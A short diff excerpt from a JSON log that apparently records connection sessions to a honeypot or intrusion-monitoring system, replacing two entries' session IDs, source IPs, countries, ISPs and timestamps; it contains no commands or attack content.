-          "session_id": "IR-8a1e7d1bbfe6",
-          "src_ip": "45.205.1.42",
-          "country": "BR",
-          "isp": "VPSVAULT.HOST LTD",
+          "session_id": "IR-c4d1ac1a1cfa",
+          "src_ip": "209.99.185.59",
+          "country": "CH",
+          "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T14:40:56.932904Z"
+          "timestamp": "2026-06-27T16:53:38.583289Z"
         },
         {
-          "session_id": "IR-e62cfc633f44",
-          "src_ip": "45.198.224.120",
-          "country": "NL",
-          "isp": "VPSVAULT.HOST LTD",
+          "session_id": "IR-ea2ba697f4bd",
+          "src_ip": "209.99.185.59",
+          "country": "CH",
+          "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T14:49:16.982425Z"
+          "timestamp": "2026-06-27T16:54:29.931506Z"
         }
       ]
     }
